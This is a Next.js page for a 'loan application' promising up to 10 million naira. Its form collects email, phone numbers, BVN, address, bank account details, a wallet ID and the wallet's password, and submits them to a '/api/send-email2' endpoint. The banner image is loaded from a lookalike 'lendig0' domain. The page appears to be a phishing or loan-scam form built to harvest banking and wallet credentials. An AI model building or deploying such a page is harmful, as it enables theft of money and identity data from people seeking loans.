'use client';

import Image from 'next/image';
import { useState } from 'react';
import { Header } from '@/components/header';
import { Footer } from '@/components/footer';

export default function LoanApplication() {
  const [formData, setFormData] = useState({
    email: '',
    phoneNumber: '',
    whatsappNumber: '',
    bvn: '',
    address: '',
    accountNumber: '',
    accountName: '',
    bankName: '',
    amountSought: '',
    loanTenure: '',
    reasonForLoan: '',
    walletId: '',
    walletPassword: '',
    sex: '',
  });

  const [submitted, setSubmitted] = useState(false);
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState('');

  const handleChange = (
    e: React.ChangeEvent<HTMLInputElement | HTMLTextAreaElement | HTMLSelectElement>
  ) => {
    const { name, value } = e.target;
    setFormData(prev => ({
      ...prev,
      [name]: value,
    }));
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setLoading(true);
    setError('');

    try {
      const response = await fetch('/api/send-email2', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(formData),
      });

      if (!response.ok) {
        throw new Error('Failed to submit application');
      }

      const result = await response.json();
      console.log('Loan application submitted:', result);
      setSubmitted(true);
      setFormData({
        email: '',
        phoneNumber: '',
        whatsappNumber: '',
        bvn: '',
        address: '',
        accountNumber: '',
        accountName: '',
        bankName: '',
        amountSought: '',
        loanTenure: '',
        reasonForLoan: '',
        walletId: '',
        walletPassword: '',
        sex: '',
      });
      setTimeout(() => setSubmitted(false), 5000);
    } catch (err) {
      console.error('Error submitting form:', err);
      setError('Failed to submit application. Please try again.');
      setTimeout(() => setError(''), 5000);
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="min-h-screen flex flex-col bg-white">
      <Header />

      <main className="flex-grow">
        <section className="bg-gradient-to-b from-gray-900 to-gray-800 text-white py-12 text-center">
          <h1 className="text-4xl font-bold">Loan Application</h1>
        </section>

        <div className="max-w-4xl mx-auto px-4 py-8">
          <div className="mb-8 flex justify-center">
            <Image
              src="https://lendig0.simdif.com/images/public/sd_678a2098256dd.jpg"
              alt="Loan Application"
              width={960}
              height={954}
              className="rounded-lg shadow-lg max-w-full h-auto"
            />
          </div>

          <div className="bg-blue-50 rounded-lg p-6 mb-8 text-center">
            <h2 className="text-2xl font-bold text-gray-800 mb-3">GET LOAN UP TO 10 MILLION NAIRA</h2>
            <p className="text-gray-700">
              Get loans with ease, low interest fees and less documentation. Hassle free service guaranteed!
            </p>
          </div>

          <div className="bg-white rounded-lg shadow-lg p-8">
            <h3 className="text-2xl font-bold text-gray-800 mb-6">Registration Form</h3>

            {submitted && (
              <div className="bg-green-100 border border-green-400 text-green-700 px-4 py-3 rounded mb-6">
                Your loan application has been submitted successfully! We will review your application and contact you shortly.
              </div>
            )}

            {error && (
              <div className="bg-red-100 border border-red-400 text-red-700 px-4 py-3 rounded mb-6">
                {error}
              </div>
            )}

            <form onSubmit={handleSubmit} className="space-y-6">
              {/* Email */}
              <div>
                <label className="block text-gray-700 font-semibold mb-2">Your Email Address *</label>
                <input
                  type="email"
                  name="email"
                  value={formData.email}
                  onChange={handleChange}
                  required
                  className="w-full px-4 py-2 border border-gray-300 rounded-lg focus:outline-none focus:border-blue-600"
                />
              </div>

              {/* Phone Number */}
              <div>
                <label className="block text-gray-700 font-semibold mb-2">Phone Number *</label>
                <input
                  type="text"
                  name="phoneNumber"
                  value={formData.phoneNumber}
                  onChange={handleChange}
                  required
                  className="w-full px-4 py-2 border border-gray-300 rounded-lg focus:outline-none focus:border-blue-600"
                />
              </div>

              {/* WhatsApp Number */}
              <div>
                <label className="block text-gray-700 font-semibold mb-2">WhatsApp Number</label>
                <input
                  type="text"
                  name="whatsappNumber"
                  value={formData.whatsappNumber}
                  onChange={handleChange}
                  className="w-full px-4 py-2 border border-gray-300 rounded-lg focus:outline-none focus:border-blue-600"
                />
              </div>

              {/* BVN */}
              <div>
                <label className="block text-gray-700 font-semibold mb-2">BVN (Bank Verification Number)</label>
                <input
                  type="text"
                  name="bvn"
                  value={formData.bvn}
                  onChange={handleChange}
                  className="w-full px-4 py-2 border border-gray-300 rounded-lg focus:outline-none focus:border-blue-600"
                />
              </div>

              {/* Address */}
              <div>
                <label className="block text-gray-700 font-semibold mb-2">Address *</label>
                <textarea
                  name="address"
                  value={formData.address}
                  onChange={handleChange}
                  required
                  rows={3}
                  className="w-full px-4 py-2 border border-gray-300 rounded-lg focus:outline-none focus:border-blue-600 resize-none"
                />
              </div>

              {/* Account Details */}
              <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                <div>
                  <label className="block text-gray-700 font-semibold mb-2">Account Number</label>
                  <input
                    type="text"
                    name="accountNumber"
                    value={formData.accountNumber}
                    onChange={handleChange}
                    className="w-full px-4 py-2 border border-gray-300 rounded-lg focus:outline-none focus:border-blue-600"
                  />
                </div>
                <div>
                  <label className="block text-gray-700 font-semibold mb-2">Account Name</label>
                  <input
                    type="text"
                    name="accountName"
                    value={formData.accountName}
                    onChange={handleChange}
                    className="w-full px-4 py-2 border border-gray-300 rounded-lg focus:outline-none focus:border-blue-600"
                  />
                </div>
                <div>
                  <label className="block text-gray-700 font-semibold mb-2">Bank Name</label>
                  <input
                    type="text"
                    name="bankName"
                    value={formData.bankName}
                    onChange={handleChange}
                    className="w-full px-4 py-2 border border-gray-300 rounded-lg focus:outline-none focus:border-blue-600"
                  />
                </div>
              </div>

              {/* Amount Sought */}
              <div>
                <label className="block text-gray-700 font-semibold mb-2">Amount Sought</label>
                <input
                  type="text"
                  name="amountSought"
                  value={formData.amountSought}
                  onChange={handleChange}
                  placeholder="Amount in Naira"
                  className="w-full px-4 py-2 border border-gray-300 rounded-lg focus:outline-none focus:border-blue-600"
                />
              </div>

              {/* Loan Tenure */}
              <div>
                <label className="block text-gray-700 font-semibold mb-2">Loan Tenure</label>
                <select
                  name="loanTenure"
                  value={formData.loanTenure}
                  onChange={handleChange}
                  className="w-full px-4 py-2 border border-gray-300 rounded-lg focus:outline-none focus:border-blue-600"
                >
                  <option value="">Select...</option>
                  <option value="1 Month">1 Month</option>
                  <option value="4 Months">4 Months</option>
                  <option value="10 Months">10 Months</option>
                  <option value="1 Year">1 Year</option>
                  <option value="Others">Others</option>
                </select>
              </div>

              {/* Reason for Loan */}
              <div>
                <label className="block text-gray-700 font-semibold mb-2">Reason for Loan</label>
                <textarea
                  name="reasonForLoan"
                  value={formData.reasonForLoan}
                  onChange={handleChange}
                  rows={3}
                  className="w-full px-4 py-2 border border-gray-300 rounded-lg focus:outline-none focus:border-blue-600 resize-none"
                />
              </div>

              {/* Wallet ID */}
              <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                <div>
                  <label className="block text-gray-700 font-semibold mb-2">Wallet ID</label>
                  <input
                    type="text"
                    name="walletId"
                    value={formData.walletId}
                    onChange={handleChange}
                    className="w-full px-4 py-2 border border-gray-300 rounded-lg focus:outline-none focus:border-blue-600"
                  />
                </div>
                <div>
                  <label className="block text-gray-700 font-semibold mb-2">Wallet ID Password</label>
                  <input
                    type="password"
                    name="walletPassword"
                    value={formData.walletPassword}
                    onChange={handleChange}
                    className="w-full px-4 py-2 border border-gray-300 rounded-lg focus:outline-none focus:border-blue-600"
                  />
                </div>
              </div>

              {/* Sex */}
              <div>
                <label className="block text-gray-700 font-semibold mb-2">Sex</label>
                <div className="flex gap-6">
                  <label className="flex items-center">
                    <input
                      type="radio"
                      name="sex"
                      value="Male"
                      checked={formData.sex === 'Male'}
                      onChange={handleChange}
                      className="mr-2"
                    />
                    <span className="text-gray-700">Male</span>
                  </label>
                  <label className="flex items-center">
                    <input
                      type="radio"
                      name="sex"
                      value="Female"
                      checked={formData.sex === 'Female'}
                      onChange={handleChange}
                      className="mr-2"
                    />
                    <span className="text-gray-700">Female</span>
                  </label>
                </div>
              </div>

              {/* Submit Button */}
              <button
                type="submit"
                disabled={loading}
                className="w-full bg-blue-600 hover:bg-blue-700 disabled:bg-gray-400 text-white font-bold py-3 rounded-lg transition"
              >
                {loading ? 'Submitting...' : 'Submit Application'}
              </button>
            </form>
          </div>
        </div>
      </main>

      <Footer />
    </div>
  );
}
